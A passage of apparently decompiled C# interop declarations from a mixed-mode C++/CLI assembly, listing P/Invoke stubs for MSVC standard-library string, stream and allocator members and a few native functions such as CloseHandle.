  public static extern unsafe _String_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eend(
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    [In] _String_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe char* std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Ec_str(
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Ecompare(
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    [In] char* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int std\u002Ebasic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esgetc(
    [In] basic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esetstate(
    [In] basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0,
    [In] int obj1,
    [MarshalAs(UnmanagedType.U1)] bool _param2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Erdbuf(
    [In] basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u003C\u003C(
    [In] basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0,
    [In] long obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u003C\u003C(
    [In] basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0,
    [In] basic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Ewrite(
    [In] basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0,
    [In] sbyte* obj1,
    [In] int obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Eflush(
    [In] basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Eseekp(
    [In] basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0,
    [In] int obj1,
    [In] int obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(
    [In] basic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    [In] int obj1,
    [In] int obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(
    [In] basic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(
    [In] basic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(
    [In] basic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0,
    [In] sbyte* obj1,
    [In] int obj2,
    [In] int obj3,
    [In] int obj4);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(
    [In] basic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0,
    [In] char* obj1,
    [In] int obj2,
    [In] int obj3,
    [In] int obj4);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_filebuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Erdbuf(
    [In] basic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void std\u002Ebasic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Eclose(
    [In] basic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(
    [In] basic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0,
    [In] int obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(
    [In] basic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0,
    [In] sbyte* obj1,
    [In] int obj2,
    [In] int obj3,
    [In] int obj4);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Eopen(
    [In] basic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0,
    [In] sbyte* obj1,
    [In] int obj2,
    [In] int obj3);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Eclose(
    [In] basic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe allocator\u003Cchar\u003E* std\u002Eallocator\u003Cchar\u003E\u002E\u007Bctor\u007D(
    [In] allocator\u003Cchar\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe allocator\u003Cwchar_t\u003E* std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D(
    [In] allocator\u003Cwchar_t\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe allocator\u003Cwchar_t\u003E* std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D(
    [In] allocator\u003Cwchar_t\u003E* obj0,
    [In] allocator\u003Cwchar_t\u003E* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void std\u002Eallocator\u003Cwchar_t\u003E\u002Edeallocate(
    [In] allocator\u003Cwchar_t\u003E* obj0,
    [In] char* obj1,
    [In] uint obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe char* std\u002Eallocator\u003Cwchar_t\u003E\u002Eallocate(
    [In] allocator\u003Cwchar_t\u003E* obj0,
    [In] uint obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe _String_val\u003Cchar\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* std\u002E_String_val\u003Cchar\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(
    [In] _String_val\u003Cchar\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    [In] allocator\u003Cchar\u003E* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe _String_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* std\u002E_String_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D(
    [In] _String_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    [In] allocator\u003Cwchar_t\u003E* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Eappend(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    [In] uint obj1,
    [In] sbyte obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ereserve(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    [In] uint obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E_Tidy(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    [MarshalAs(UnmanagedType.U1)] bool _param1,
    [In] uint obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe sbyte* std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E_Myptr(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eappend(
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    [In] uint obj1,
    [MarshalAs(UnmanagedType.U2)] char _param2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Tidy(
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    [MarshalAs(UnmanagedType.U1)] bool _param1,
    [In] uint obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe char* std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Myptr(
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int std\u002Ebasic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esbumpc(
    [In] basic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int std\u002Ebasic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esputc(
    [In] basic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0,
    [In] sbyte obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int std\u002Ebasic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esputn(
    [In] basic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0,
    [In] sbyte* obj1,
    [In] int obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void std\u002Ebasic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E_Unlock(
    [In] basic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe sbyte std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Efill(
    [In] basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void std\u002Ebasic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E_Lock(
    [In] basic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Etie(
    [In] basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E_Osfx(
    [In] basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe uint std\u002Eallocator\u003Cwchar_t\u003E\u002Emax_size(
    [In] allocator\u003Cwchar_t\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Ereserve(
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    [In] uint obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern int __CxxQueryExceptionSize();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe long _time64([In] long* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int __CxxDetectRethrow([In] void* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int CloseHandle([In] void* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
